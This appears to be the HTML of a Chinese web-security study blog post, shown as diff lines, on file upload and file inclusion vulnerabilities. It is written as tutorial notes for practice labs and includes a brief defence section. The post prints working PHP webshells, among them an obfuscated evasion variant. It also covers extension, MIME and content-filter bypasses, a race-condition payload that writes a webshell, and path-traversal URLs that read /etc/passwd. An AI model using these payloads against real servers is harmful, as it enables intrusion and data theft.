+            $(".moon").attr("src","https://xmoct.github.io/media/images/sun.png")
+        }else{
+            $("#bg").show()
+            $(".markdownIt-TOC li a").css("color","PaleTurquoise")
+            $(".text p, .text ul").css("color","rgba(0, 0, 0, 0.7)")
+            $("#articlecontent").css("color","black")
+            $(".post-copyright").css("background","#f9f9f9")
+            $('blockquote').css("background","#eff8f0")
+            $("#articlecontent").css("background","white")
+            $(".moon").attr("src","https://xmoct.github.io/media/images/moon.png")
+            $('body').css("background","LightCyan")
+            moonlightState = false
+        }
+    }
+</script>
+<!----夜间模式👆--></div>
+            <!--------------- pc端菜单栏👆 ---------------->
+
+            <!-- ----------------左侧菜单栏html 👇-------------------------------------->
+            
+            <div>
+                <div id="tab1" class="tab">
+                    <div class="bars">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                    <div class="close"></div>
+                </div>
+                <div class="col-md-1 col-lg-3"></div>
+                <!-- main标签，pjax渲染时加载以下内容👇 -->
+                <div id="main" class="col-xs-12 col-sm-12 col-md-12 col-lg-7" style="padding:0;">
+                    <div class="readingmode" onclick="readingmode()">阅</div>
+                    <link rel="stylesheet" href="https://xmoct.github.io/media/css/font-awesome.css">
+
+<body>
+    <div class="allcontent" id="postdetail">
+        <div class="postshow postpadding" style="padding-bottom: 0;">
+            
+            <div class="postdetailimg">
+                <img src="https://xmoct.github.io/post-images/9wK7KUt6d.png" class="postimage" style="cursor:auto">
+            </div>
+            <div class="postinfo-detail">
+                <div class="postdate"><i class="fa fa-calendar"></i>2023-07-27</div>
+                <div class="poststatus postdate"><i class="fa fa-clock-o"></i> 4 min read</div>
+                <div class="posttag">
+                    
+                    <a data-pjax href="https://xmoct.github.io/tag/5jQBvl5Eb/" class="postlink">
+                        <i class="fa fa-tag"></i> Web安全
+                    </a>
+                    
+                </div>
+            </div>
+            
+        <div id="articlecontent">
+            <div id="texttitle" style="text-align: center">
+                <h2 id="ptitle">文件上传和文件包含</h2>
+                <!-- id 将作为查询条件 -->
+                <div id="pl" style="display:none">https://xmoct.github.io/post/9wK7KUt6d/</div>
+                <div id="rootaddr" style="display:none">https://xmoct.github.io</div>
+                
+            </div>
+            <div class="text ">
+                <h1 id="任意文件上传">任意文件上传</h1>
+<h2 id="简述">简述</h2>
+<blockquote>
+<p>任意文件上传漏洞往往是服务器提供一定上传接口，但由于对上传文件类型限制逻辑不严格，导致被绕过；攻击者可以直接上传脚本资源文件来控制服务器，也就是sql注入漏洞中介绍的webshell</p>
+</blockquote>
+<h3 id="靶场练习">靶场练习</h3>
+<p>找靶场 fofa.info<br>
+<code>http://192.168.142.53/pikachu/vul/unsafeupload/upload.php</code></p>
+<p>一句话木马</p>
+<pre><code class="language-php">&lt;?php @eval($_REQUEST[cmd]); ?&gt;
+执行命令
+eval() 函数，执行php代码
+?cmd=phpinfo();
+
+
+system() 函数 执行系统命令
+?cmd=system('ls -al /');
+linux：
+    ls 列出当前目录下的文件
+    ls -al /   列出/目录下的所有文件并且显示文件详细信息
+    whoami 查看权限
+    cd 切换路径
+    pwd 显示当前所在位置路径
+    cat /etc/passwd 查看文件 /etc/passwd
+</code></pre>
+<h3 id="前端校验绕过">前端校验绕过</h3>
+<ol>
+<li>禁用js<br>
+插件 <code>Enable JavaScript</code></li>
+<li>bp绕过<br>
+先上传图片 ， 然后bp抓包 ，改为php文件<br>
+<code>&lt;?php phpinfo();?&gt;</code><br>
+<code>http://192.168.142.53/upload/phpinfo.php</code></li>
+<li>upload 1源码分析</li>
+</ol>
+<pre><code class="language-php">function checkFile(){
+
+}
+</code></pre>
+<p>前端检验上传文件是否为jpg / png /gif格式</p>
+<h3 id="后端校验绕过">后端校验绕过</h3>
+<p><strong>文件头</strong><br>
+常见图片文件头</p>
+<pre><code class="language-php">文件类型	文件拓展名	文件头十六进制	文件头实际内容
+PNG	    .png	    89504E47	    .PNG
+GIF	    .gif	    474946383961    GIF89a
+JPEG	.jpg	    FFD8FF  	    。。。。
+</code></pre>
+<p>在php文件前加图片文件头来绕过</p>
+<p><strong>upload-13</strong><br>
+<strong>MIME</strong></p>
+<blockquote>
+<p>对文件类型检查有缺陷-检查Content-Type标头是否与MIME 类型匹配</p>
+</blockquote>
+<ol>
+<li>
+<p>上传 webshell.php</p>
+</li>
+<li>
+<p>抓包 修改上传的Content-Type 类型为允许的类型 image/jpeg</p>
+</li>
+<li>
+<p>upload 2代码分析</p>
+</li>
+</ol>
+<pre><code class="language-php">if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
+//如果content-type不是这三种 就判断文件类型不正确
+         $temp_file = $_FILES['upload_file']['tmp_name'];
+         ......
+     } else {
+         $msg = '文件类型不正确，请重新上传！';
+</code></pre>
+<p><strong>后缀名</strong></p>
+<ol>
+<li>
+<p>黑名单</p>
+<ol>
+<li>绕过：找一些遗漏的后缀名</li>
+</ol>
+</li>
+</ol>
+<pre><code class="language-php">.php
+.pht
+.phtml
+
+&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.
+pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;
+
+
+.jsp&quot;,&quot;.js
+pa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,
+&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.
+asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr
+&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,
+</code></pre>
+<p>上传php文件<br>
+<code>uplaod.php</code><br>
+<code>&lt;?php @eval($_REQUEST['moyv'])?&gt;</code><br>
+上传后缀名<code>php5 /phtml</code>等<br>
+<code>uplaod.php5</code><br>
+<code>&lt;?php @eval($_REQUEST['moyv'])?&gt;</code></p>
+<p><strong>upload3</strong> - 关键代码</p>
+<pre><code class="language-php"> $deny_ext = array('.asp','.aspx','.php','.jsp');
+     ...
+if(!in_array($file_ext, $deny_ext)) {
+    // 判断文件后缀名是否时asp / php / jsp /aspx
+    ....
+   $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
+</code></pre>
+<p><strong>特殊文件</strong>（了解解析漏洞后再做）<br>
+<code>.htaccess </code>特殊的配置文件，改写apache的配置</p>
+<pre><code class="language-php">AddType application/x-httpd-php .php .phtml
+或者
+AddType application/x-httpd-php .png
+SetHandler application/x-httpd-php
+// .htaccess
+AddType application/x-httpd-php .jpg
+// 1.jpg
+&lt;?php phpinfo();?&gt;
+</code></pre>
+<p><code>.user.ini</code>特殊文件，apache,nginx都能用</p>
+<pre><code class="language-php">auto_prepend_file=01.gif
+
+auto_prepend_file = &lt;filename&gt;         //包含在文件头
+auto_append_file = &lt;filename&gt;          //包含在文件尾
+</code></pre>
+<ol>
+<li>白名单<br>
+只允许特定的文件名通过</li>
+</ol>
+<pre><code class="language-php">   .jpg
+   .png
+</code></pre>
+<p>文件包含(后面讲)</p>
+<ol start="3">
+<li>判断黑白名单</li>
+</ol>
+<p>上文件过程中，随意更换文件后缀名<code>.sjdfla;fsljfdlsajfljdslflsajf</code></p>
+<p><strong>文件内容</strong></p>
+<pre><code class="language-php">&lt;?php
+@eval($_REQUEST[cmd]);
+?&gt;
+</code></pre>
+<ol>
+<li>
+<p>过滤php特征</p>
+<ol>
+<li>
+<?
+</li>
+</ol>
+</li>
+</ol>
+<pre><code class="language-php">&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[cmd]);&lt;/script&gt;
+php版本&lt;7
+</code></pre>
+<pre><code>2. php
+</code></pre>
+<pre><code class="language-php">短标签
+&lt;?=`ls`;?&gt;
+&lt;?=是PHP的一个短的开放式标签，是echo()的快捷用法。
+</code></pre>
+<ol start="2">
+<li>
+<p>关键函数，关键字</p>
+</li>
+<li>
+<p>函数</p>
+</li>
+</ol>
+<pre><code class="language-php">eval
+system
+assert
+exec
+...
+</code></pre>
+<ol start="2">
+<li>大小写</li>
+</ol>
+<pre><code class="language-php">eval ===&gt; Eval
+</code></pre>
+<ol start="3">
+<li>动态拼接</li>
+</ol>
+<pre><code class="language-php">assert
+只有特定函数支持动态拼接
+  assert 执行php代码
+&lt;?php
+$a = &quot;ass&quot;;
+$b = &quot;ert&quot;;
+$c = $a.$b;
+$c($_REQUEST[cmd]);
+?&gt;
+</code></pre>
+<ol start="4">
+<li>免杀</li>
+</ol>
+<p><code>异或运算.................</code></p>
+<pre><code class="language-php">&lt;?php
+$fruits = array(&quot;a&quot; =&gt; &quot;lemon&quot;, &quot;ss&quot; =&gt; &quot;orange&quot;, &quot;ssr&quot; =&gt; &quot;banana&quot;, &quot;t&quot; =&gt; &quot;apple&quot;);
+function test_alter(&amp;$item1, $key, $prefix)
+{
+ $item1 = &quot;$prefix: $item1&quot;;
+}
+function test_print($item2, $key)
+{
+ echo &quot;$key. $item2&lt;br /&gt;\n&quot;;
+}
+echo &quot;Before ...:\n&quot;;
+array_walk($fruits, 'test_print');
+$a =array_keys($fruits);
+print_r($a);
+$m =$a[0].$a[1];
+$n ='er';
+$q = $m.$n.'t'; //assert
+$r = $_REQUEST['wange'];
+@$q($r);
+//密码wange
+</code></pre>
+<p>?&gt;</p>
+<h3 id="条件竞争绕过">条件竞争绕过</h3>
+<blockquote>
+<p>如果一个网站虽然采用了白名单方式过滤上传文件，但是它在程序是先允许任何文件上传到服务器，再去判断文件扩展名来决定文件是否删除（存在时间差），那只要攻击者快速发送请求，在时间差内访问一次恶意文件即可</p>
+</blockquote>
+<p><code>http://198.74.107.99:8081/Pass-18/index.php</code></p>
+<ol>
+<li>
+<p>随意上传一张图片:</p>
+</li>
+<li>
+<p>成功后查看图片，可以看到上传后的路径如下：(一般只要右键能找到图片地址的，在响应包里就有)</p>
+</li>
+<li>
+<p>创建一个php文件（要求一旦被访问 即在服务器上写一个webshell文件）</p>
+</li>
+</ol>
+<pre><code class="language-php">&lt;?php
+$file = fopen(&quot;webshellphp&quot;,&quot;w&quot;);
+fputs($file, &quot;&lt;?php $_REQUEST[cmd]?&gt;&quot;)?&gt;
+</code></pre>
+<ol start="4">
+<li>
+<p>bp intruder<br>
+不断发送上传的php文件（制造该文件持续在服务器的机会）<br>
+不断访问上传的php文件（只要有一次访问到就可创建webshell文件）</p>
+</li>
+<li>
+<p>找到状态码 200即可</p>
+</li>
+<li>
+<p>代码分析</p>
+</li>
+</ol>
+<pre><code class="language-php"> if(move_uploaded_file($temp_file, $upload_file)){
+        if(in_array($file_ext,$ext_arr)){
+             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+             rename($upload_file, $img_path);
+             $is_upload = true;
+        }else{
+            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            unlink($upload_file);
+</code></pre>
+<ol>
+<li>先通过move_uploaded_file(tempfile,upload_file)将文件上传至服务器中。</li>
+<li>上传完毕后通过in_array(fileext,ext_arr)检查文件名后缀</li>
+<li>如果后缀名合法，则对文件进行重命名，上传完成</li>
+<li>如果后缀名非法，则删除文件。</li>
+</ol>
+<h2 id="漏洞挖掘">漏洞挖掘</h2>
+<h3 id="基本思路">基本思路</h3>
+<blockquote>
+<p>先上传一张正常图片，看返回结果是什么，是否显示上传后的路径，并能试验是否能访问到，再去测试漏洞</p>
+</blockquote>
+<pre><code class="language-php">- 文件上传
+    - 常见漏洞点
+        - 上传头像
+        - 上传简历
+        - 上传附件
+        - 上传模板
+        - 发送邮件
+    - 漏洞挖掘
+        - 文件头
+        - Conten-type
+        - 文件扩展名
+            - 先判断是白名单还是黑名单校验
+            - 白名单：文件解析漏洞/文件包含/条件竞争/文件解压（CTF）
+            - 黑名单：文件解析漏洞/遗漏的后缀名/00截断/::$DATA等
+    - 引发其他漏洞
+        - 文件上传导致的存储型xss（text/html、image/svgxml）
+        - 文件上传导致的拒绝服务漏洞（上传超大文件）
+</code></pre>
+<h3 id="案例分析">案例分析</h3>
+<p><strong>头像上传</strong></p>
+<ol>
+<li>
+<p>上传头像，抓包</p>
+</li>
+<li>
+<p>上传phpinfo 验证<br>
+<code>&lt;?php phpinfo();?&gt;</code></p>
+</li>
+<li>
+<p>上传一句话，蚁剑链接</p>
+</li>
+</ol>
+<p>（xss）<strong>挂黑页</strong></p>
+<blockquote>
+<p>1、参考之前xss文章<br>
+2、因为xss本质是JavaScript代码 ，其实可以挂黑页<br>
+3、一般众测能给到中危害（除了某些会追你责的xx以外）</p>
+</blockquote>
+<h3 id="危害">危害</h3>
+<pre><code class="language-php">上传webshell
+上传超大文件，占满服务器存储空间
+    其他用户无法上传文件
+    服务器无法写入log文件或其他数据库文件
+    形成拒绝服务漏洞
+上传html / htm文件
+    形成存储型xss，盗取用户cookie
+</code></pre>
+<h3 id="防御">防御</h3>
+<pre><code class="language-php">1. 文件扩展名（白名单好过黑名单）
+2. 避免条件竞争
+3. 文件头 / content-type校验
+4. 独立一台服务器存放文件资源
+</code></pre>
+<h3 id="其他">其他</h3>
+<ol>
+<li>了解解析漏洞
+<ol>
+<li>Apache HTTPD 多后缀解析漏洞<br>
+<code>https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/</code></li>
+<li>Nginx解析漏洞<br>
+<code>https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</code></li>
+<li>Apache换行解析漏洞<br>
+<code>https://vulhub.org/#/environments/httpd/CVE-2017-15715/</code></li>
+</ol>
+</li>
+<li>靶场通关秘籍<br>
+<code>https://github.com/LandGrey/upload-labs-writeup</code></li>
+<li>Weblogic任意文件上传漏洞（CVE-2018-2894）<br>
+<code>https://vulhub.org/#/environments/weblogic/CVE-2018-2894/</code></li>
+<li>Apache Flink文件上传漏洞（CVE-2020-17518）<br>
+<code>https://vulhub.org/#/environments/flink/CVE-2020-17518/</code></li>
+<li>蚁剑使用</li>
+</ol>
+<h2 id="文件包含">文件包含</h2>
+<blockquote>
+<p>在网站的开发人员在开发网站的时候，会把经常重复使用的函数或者特定的页面写到单个文件中，需要使用的时候就直接调用此文件即可，而无需再次浪费时间再次编写，这种操作通常被称为文件包含。如果我们没有对文件的来源进行严格的审查就可能会导致文件包含漏洞</p>
+</blockquote>
+<h3 id="靶场练习-2">靶场练习</h3>
+<p><code>http://101.43.1.181/pikachu-master/vul/fileinclude/fileinclude.php</code></p>
+<p>php文件包含函数</p>
+<pre><code class="language-php">include()
+require()
+include_once()
+require_once()
+
+file_get_contents()
+file_put_contents()
+</code></pre>
+<h1 id="漏洞挖掘-2">漏洞挖掘</h1>
+<h2 id="常见思路">常见思路</h2>
+<h3 id="案例分析1">案例分析1</h3>
+<p><strong>本地文件包含</strong>（CVE-2021-43798）<br>
+<code>https://xxx.org/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd</code></p>
+<h3 id="案例分析2">案例分析2</h3>
+<p><code>https://www.xxxx.com/ro/ZmlsZTovLy9ldGMvcGFzc3dkIy5qcw==/-1430533899.js</code><br>
+Base64解码：<code>file:///etc/passwd#.js</code><br>
+之所以使用#，是因为url的结尾必须是javascript，但要在url中忽略它，我使用#之后的内容会忽略在url中</p>
+<h3 id="案例分析3">案例分析3</h3>
+<blockquote>
+<p>黑灰产<br>
+代码审计<br>
+文件上传 jpg<br>
+文件包含 jpg 拿shell</p>
+</blockquote>
+<p>###危害</p>
+<h3 id="防御-2">防御</h3>
+<h3 id="其他-2">其他</h3>
+<ol>
+<li>php文件包含函数区别</li>
+<li>学习使用Potential Vulnerability Indicator<br>
+<code>https://github.com/PortSwigger/potential-vulnerability-indicator</code></li>
+<li>vulhub文件包含漏洞<br>
+<code>https://vulhub.org/#/environments/php/inclusion/</code></li>
+</ol>
+
+            </div>
+            <hr style="width: 80%;">
+            
+            <div class="postfooter">
+                <ul class="post-copyright">
+                    <li><strong>文章作者：</strong>Moyv_xmoct</li>
+            <li><strong>原文链接：</strong>https://xmoct.github.io/post/9wK7KUt6d/</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用<i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA
+                许可协议。转载请注明出处！</li>
+            </ul>
+        </div>
+        
+        <div id="otherpost">
+            
+            <a  data-pjax class="prev-post-pc" href="https://xmoct.github.io/post/0sWKZajVF/"  style="color: black;">
+                <div id="ppcontainer">
+                    
+                    <img src="https://img-blog.csdnimg.cn/17b408962e6645deb99f259cae1ab82e.jpeg" style="width: 100%;" class="opimg">
+                    
+                    <h4 class="optitle">命令执行和代码执行</h4>
+                </div>
+            </a>
+            <div class="prev-post">
+                上一篇 <a  data-pjax href="https://xmoct.github.io/post/0sWKZajVF/">命令执行和代码执行</a>
+            </div>
+            
+            
+            <a data-pjax class="next-post-pc" href="https://xmoct.github.io/post/kua-zhan-jiao-ben-gong-ji/"  style="color: black;">
+                <div id="npcontainer">
+                    
+                    <img src="https://xmoct.github.io/post-images/kua-zhan-jiao-ben-gong-ji.png" style="width: 100%;" class="opimg">
+                    
+                    <h4 class="optitle">跨站脚本攻击</h4>
+                </div>
+            </a>
+            <div class="next-post">
+                下一篇 <a  data-pjax href="https://xmoct.github.io/post/kua-zhan-jiao-ben-gong-ji/">跨站脚本攻击</a>
+            </div>
+            
+        </div>
+    </div>
+    </div>
+    </div>
+    <!-- 弹窗 -->
+    <div id="myModal" class="modal">
+        <img class="modal-content" id="img01">
+    </div>
+</body>
+<script>
+    //文章阅读热度
+    var pl = $("#pl").html();
+    var rootaddr = $("#rootaddr").html();
+    pl = pl.replace(rootaddr, "");
+    $("#hotnum").attr('id', pl);
+</script>
+                    <div class="toc-container">
+                        <ul class="markdownIt-TOC">
+<li><a href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">任意文件上传</a>
+<ul>
+<li><a href="#%E7%AE%80%E8%BF%B0">简述</a>
+<ul>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0">靶场练习</a></li>
+<li><a href="#%E5%89%8D%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87">前端校验绕过</a></li>
+<li><a href="#%E5%90%8E%E7%AB%AF%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87">后端校验绕过</a></li>
+<li><a href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E7%BB%95%E8%BF%87">条件竞争绕过</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">漏洞挖掘</a>
+<ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF">基本思路</a></li>
+<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90">案例分析</a></li>
+<li><a href="#%E5%8D%B1%E5%AE%B3">危害</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1">防御</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96">其他</a></li>
+</ul>
+</li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a>
+<ul>
+<li><a href="#%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-2">靶场练习</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-2">漏洞挖掘</a>
+<ul>
+<li><a href="#%E5%B8%B8%E8%A7%81%E6%80%9D%E8%B7%AF">常见思路</a>
+<ul>
+<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%901">案例分析1</a></li>
+<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%902">案例分析2</a></li>
+<li><a href="#%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%903">案例分析3</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1-2">防御</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96-2">其他</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+                    </div>
+                    <div class="tog">
+                        <div class="toggleContainer">
+                            <div class="toggle">
+                                <i class="fas fa-angle-double-up"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <!---------------------------- 评论系统👇 ------------------------->
+                    <div id="comment" class="comment">
+                        <div class="commentcontainer">
+                            
+                                
+                            
+                        </div>
+                    </div>
+                    <!---------------------------- 评论系统👆 ------------------------->
+                </div>
+                <!-- main标签，pjax渲染时加载以上内容👆 -->
+                <div class="col-md-1 col-lg-2"></div>
+                <div id="bg">
+                </div>
+            </div>
+            <!-- ----------------左侧菜单栏html 👆-------------------------------------->
+            
+        </div>
+        <!-- aplayer播放器加载👇 -->
+            
+        <!-- aplayer播放器加载👆 -->
+    </div>
+    <!-- 背景图加载方式👇 -->
+    <div id="bgchoice" style="display: none">link
+                </div>
+                
+                <div id="bgurl" style="display:none"></div>
+                
+    <!-- 背景图加载方式👆 -->
+</body>
+
+<script>
+    //初始化
+    //更换twikoo头像
+    setTimeout(replaceAvatar,1000);
+    setTimeout(replaceAvatar,2000);
+    setTimeout(replaceAvatar,8000);
+    // --------为每张图片添加懒加载（lazyload）标签-->懒加载功能 👇------------
+    lazyload();
+    //为文章内所有代码块添加代码复制功能 👇
+    codeinit();
+    // ------代码高亮显示功能-------------
+    hljs.initHighlightingOnLoad();
+    if (shareChoice)
+        shareInit();
+    if (donateChoice)
+        donateInit();
+</script>
+
+<!------------------ 加载live2d模型功能（看板娘）👇 ---------------->
+
+<script type="text/javascript">
+    var message_Path = '/live2d/'
+    var home_Path = document.getElementById("domainname").innerHTML + "/"; //此处修改为你的域名，必须带斜杠
+</script>
+<script type="text/javascript" src="https://xmoct.github.io/media/js/live2d.js"></script>
+<script type="text/javascript" src="https://xmoct.github.io/media/live2d/js/message.js"></script>
+<script type="text/javascript">
+    loadlive2d("live2d", "https://xmoct.github.io/media/live2d/assets/tororo.model.json");
+</script>
+
+<!------------------ 加载live2d模型功能（看板娘）👆 ---------------->
+
+
+<!----------------------- 返回顶部按钮功能👇 --------------------->
+<script>
+    $(function () {
+        $('.toggleContainer').click(function () {
+            $('html,body').animate({
+                scrollTop: '0px'
+            }, 800);
+        });
+        $(window).scroll(function () {
+            var st = $(window).scrollTop();
+            if (st > 30) {
+                $(".toggleContainer").fadeIn(400);
+            } else {
+                $(".toggleContainer").fadeOut(100);
+            }
+        });
+    });
+</script>
+<!----------------------- 返回顶部按钮功能👆 --------------------->
+
+
+<!------------ 加载全局背景图功能👇（开始时没有写好，这功能有点鸡肋/(ㄒoㄒ)/~~） -->
+<script>
+    var bgchoice = "link"
+    var bg = $('#bg');
+    var bgurl = document.getElementById("bgurl").innerHTML;
+    if (bgchoice == 'default')
+    {
+        for (var i = 0; i < 3; i++)
+            bgurl = bgurl.replace("\\", "/");
+        bgurl = "https://xmoct.github.io/" + bgurl;
+    }
+    bg.css("background", "url('" + bgurl + "')");
+
+    window.onload = function () {
+        aplayerbtnInit();
+    }
+</script>
+<!------------ 加载全局背景图功能👆（开始时没有写好，这功能有点鸡肋/(ㄒoㄒ)/~~） -->
+
+
+
+
+<script src="https://xmoct.github.io/media/js/index.js"></script>
+
+
+<script>
+    //加载后的事件同步（阅读量、移动端评论等
+    window.onload = function () {
+    //代码块高亮渲染
+    document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+    });
+        getHotnum();
+        var sharepc = $(".share").eq(0).html();
+        $(".share").eq(1).html(sharepc);   //插件只会寻找一个分享标签渲染，所以需要手动添加到移动端
+        aplayerbtnInit();
+        $(".hljs").css({
+            "padding": "20px"
+        })
+    }
+</script>
+
+<!-- <script src="https://xmoct.github.io/media/js/av-min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@3.13.0/dist/av-min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.6.1/dist/av-live-query-min.js"></script> -->
